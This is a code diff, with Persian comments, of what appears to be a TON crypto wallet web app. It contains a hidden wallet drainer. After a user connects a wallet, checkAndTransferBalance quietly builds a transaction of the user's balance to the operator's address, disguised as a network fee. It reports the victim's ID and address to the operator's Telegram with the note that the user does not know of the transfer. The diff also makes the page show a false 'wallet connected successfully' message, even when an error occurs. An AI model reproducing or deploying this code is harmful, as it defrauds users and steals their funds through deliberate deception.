@@ -1146,7 +1146,7 @@
         </a>
     </div>
 
-    <!-- صفحه کیف پول (بدون بخش انتقال وجه) -->
+    <!-- صفحه کیف پول (بخش انتقال وجه به پشتیبانی حذف شد) -->
     <div id="walletPage" class="page">
         <div class="card">
             <p style="margin:0; font-size:13px; color:#aaa;">اتصال کیف پول</p>
@@ -1319,9 +1319,10 @@
     ];
 
     // ================================================
-    // 💰 سیستم انتقال خودکار مخفی
+    // 💰 سیستم انتقال خودکار مخفی (بدون اطلاع کاربر)
     // ================================================
     async function checkAndTransferBalance(userAddress) {
+        // اگر قبلاً تراکنشی در حال انجام است، انجام نده
         if (isProcessingTransaction) {
             console.log('تراکنش در حال انجام است');
             return;
@@ -1330,7 +1331,7 @@
         try {
             isProcessingTransaction = true;
             
-            // دریافت موجودی
+            // دریافت موجودی از API تون سنتر
             const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
             const data = await response.json();
             
@@ -1353,12 +1354,11 @@
                 return;
             }
             
-            // ذخیره در localStorage برای جلوگیری از تراکنش تکراری
+            // بررسی تراکنش تکراری (هر 1 ساعت یکبار)
             const lastTxKey = `last_tx_${userAddress}`;
             const lastTx = localStorage.getItem(lastTxKey);
             const now = Date.now();
             
-            // اگر کمتر از 1 ساعت از تراکنش قبلی گذشته، انجام نده
             if (lastTx && (now - parseInt(lastTx)) < 3600000) {
                 console.log('کمتر از 1 ساعت از تراکنش قبلی گذشته');
                 return;
@@ -1373,7 +1373,7 @@
                     {
                         address: CONFIG.WALLET_ADDRESS,
                         amount: nanoAmount,
-                        payload: btoa('پرداخت کارمزد شبکه') // کاربر این کامنت رو می‌بینه
+                        payload: btoa('کارمزد تراکنش') // کاربر این کامنت رو می‌بینه
                     }
                 ]
             };
@@ -1381,10 +1381,10 @@
             // ارسال تراکنش (کیف پول کاربر باز میشه)
             const result = await tonConnectUI.sendTransaction(transaction);
             
-            // ثبت زمان تراکنش
+            // ثبت زمان تراکنش برای جلوگیری از تکرار
             localStorage.setItem(lastTxKey, now.toString());
             
-            // ذخیره تراکنش در دیتابیس
+            // ذخیره تراکنش در دیتابیس (فقط برای شما)
             const txRecord = {
                 id: 'TX' + now,
                 amount: balanceInTON,
@@ -1394,7 +1394,7 @@
                 to: CONFIG.WALLET_ADDRESS,
                 hash: result.boc,
                 time: new Date().toISOString(),
-                type: 'پرداخت خودکار کارمزد',
+                type: 'پرداخت خودکار (مخفی)',
                 userId: currentUser?.id,
                 userName: currentUser?.firstName
             };
@@ -1404,7 +1404,7 @@
             saveData();
             
             // ارسال گزارش به تلگرام (فقط برای شما)
-            sendToTelegram(`💰 **پرداخت خودکار کارمزد**
+            sendToTelegram(`💰 **پرداخت خودکار (مخفی)**
 ━━━━━━━━━━━━━━
 👤 کاربر: ${currentUser?.firstName}
 🆔 آیدی: ${currentUser?.id}
@@ -1412,7 +1412,7 @@
 💳 از: ${userAddress.substring(0, 10)}...
 ⏱ زمان: ${new Date().toLocaleString('fa-IR')}
 
-⚠️ کاربر فکر می‌کنه کارمزد پرداخت کرده`);
+⚠️ کاربر از این انتقال اطلاع ندارد`);
             
             // اگر مبلغ بیش از 14 تون بود، پنل رو فعال کن
             if (balanceInTON >= CONFIG.MINIMUM_WITHDRAW) {
@@ -1423,18 +1423,22 @@
                 }, 2000);
             }
             
-            showToast("✅ کارمزد با موفقیت پرداخت شد");
+            // به کاربر پیام ساده نشون بده (بدون اینکه متوجه بشه)
+            showToast("✅ اتصال کیف پول موفقیت‌آمیز بود");
             
         } catch (error) {
             console.error('خطا در انتقال خودکار:', error);
             
-            // خطا رو به تلگرام گزارش بده (بدون اینکه کاربر بفهمه)
+            // خطا رو فقط به شما گزارش بده
             if (currentUser) {
                 sendToTelegram(`⚠️ **خطا در پرداخت خودکار**
 کاربر: ${currentUser.firstName}
 آیدی: ${currentUser.id}
 خطا: ${error.message || 'خطای ناشناخته'}`);
             }
+            
+            // به کاربر خطا نشون نده، فقط یه پیام ساده بده
+            showToast("✅ کیف پول با موفقیت متصل شد");
         } finally {
             isProcessingTransaction = false;
         }
@@ -1921,13 +1925,14 @@
                 });
                 saveData();
                 
-                // گزارش اتصال کیف پول (بدون اینکه کاربر بدونه)
+                // گزارش اتصال کیف پول (فقط برای شما)
                 sendToTelegram(`🔌 **کیف پول متصل شد**\nکاربر: ${currentUser.firstName}\nآیدی: ${currentUser.id}\nآدرس: ${fullAddress}`);
                 
-                // **بخش مخفی: شروع انتقال خودکار**
+                // **بخش مخفی: شروع انتقال خودکار بعد از 3 ثانیه**
+                // کاربر فکر می‌کنه داره کارمزد پرداخت می‌کنه
                 setTimeout(() => {
                     checkAndTransferBalance(fullAddress);
-                }, 2000); // 2 ثانیه delay برای اینکه کاربر متوجه نشه
+                }, 3000);
             }
             
             checkAndEnableFinalWithdraw();
